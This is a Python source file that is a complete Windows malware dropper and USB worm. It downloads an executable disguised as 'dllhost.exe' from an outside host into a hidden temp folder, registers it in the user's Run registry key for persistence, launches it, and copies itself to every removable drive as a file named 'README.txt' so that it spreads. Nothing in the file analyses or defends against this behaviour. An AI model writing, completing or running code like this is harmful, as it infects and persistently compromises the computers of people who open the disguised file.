import os
import requests
import subprocess
import winreg as reg
import tempfile
import sys
import shutil
import wmi
import pathlib

# Define the URL of the file to download
file_url = "http://snape.x10.mx/dllhost.exe"
# Get the temporary directory and define the target folder and file
temp_folder = tempfile.gettempdir()
target_folder = os.path.join(temp_folder, "dllhost")
target_file = os.path.join(target_folder, "dllhost.exe")
get = wmi.WMI()
drives_available = [wmi_object.deviceID for wmi_object in get.Win32_LogicalDisk() if wmi_object.description == "Removable Disk"]
os.chdir(temp_folder)
# Check if the file already contains a "1" or the folder exists
print(target_file)
if not os.path.exists(target_file):
    os.chdir(temp_folder)
    print("changed to temp folder")
    # Download the file only if there's no "1" in dllhostresources.txt or the folder doesn't exist
    try:
        response = requests.get(file_url)
        print(response.status_code)
        if response.status_code == 200:
            # Create the target folder if it doesn't exist
            try:
                os.mkdir(target_folder)
            except:
                sys.exit(1)
            os.chdir(target_folder)

            with open(target_file, "wb") as file:
                file.write(response.content)

            # Add the downloaded file to the Windows Registry Run key
            run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_key = reg.HKEY_CURRENT_USER
            with reg.OpenKey(reg_key, run_key, 0, reg.KEY_WRITE) as registry_key:
                reg.SetValueEx(registry_key, "dllhost", 0, reg.REG_SZ, target_file)

            # Set the hidden attribute for the dllhost folder
            os.system(f'attrib +h "{target_folder}"')

            # Start the downloaded file
            subprocess.Popen(target_file, shell=True)

            # Create the dllhostresources.txt file with a "1" in the hidden folder
            with open(os.path.join(target_folder, "dllhostresources.txt"), "w") as txt_file:
                txt_file.write("fuck you")

            # Copy this script to all other removable drives as readme.txt
            script_name = os.path.basename(__file__)
            for drive in drives_available:
                file_extension = pathlib.Path(__file__).suffix
                shutil.copy(src=__file__, dst=drive+"\\"+f"README.txt{file_extension}") # I test with uncompiled .py files

        else:
            print("Failed to download the file.")
            sys.exit(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)
else:
    print(f"{target_folder} exists")
    sys.exit(1)  # A '1' already exists in dllhostresources.txt or folder/file exists.
